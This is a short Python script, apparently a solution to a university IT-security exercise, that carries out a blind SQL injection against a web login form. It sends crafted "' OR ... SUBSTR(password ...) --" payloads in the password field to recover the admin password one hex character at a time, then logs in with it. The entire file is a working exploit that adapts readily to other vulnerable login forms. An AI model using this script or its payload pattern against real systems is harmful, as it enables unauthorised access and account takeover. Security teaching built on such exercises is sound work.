import sys
import requests

expected_length = 16 * 2  # a password has 16 bytes, represented in hex
host = "itsec.sec.in.tum.de:7012"  # you may change this to localhost:5000

# hex alphabet, .hex uses lower case letters (app.py uses random hex based admin password)
alphabet = "0123456789abcdef"
alphabet_len = len(alphabet)

print(alphabet_len)

password = []

with requests.Session() as session:
    index = session.get("http://{}".format(host))
    assert index.status_code == 200

    while len(password) < expected_length:
        current_length = len(password)

        print("------------------")

        print("Brute forcing letter of index {}".format(current_length))
        base_password = "".join(password)

        for digit in alphabet:
            login = session.post("http://{}".format(host), data={
                "username": "admin",
                "password": "' OR '{}'=SUBSTR(password, 1, '{}') --"
                                 .format(base_password + digit, current_length + 1)
            })

            if "cheap" in login.text:
                password.append(digit)
                print("Found next letter: {}".format(digit))
                break
        else:
            sys.exit("Could not find value next digit for current_length {}".format(current_length))

    print("The final password is: {}".format("".join(password)))

    login = session.post("http://{}".format(host), data={"username": "admin", "password": "".join(password)})
    print(login.text)
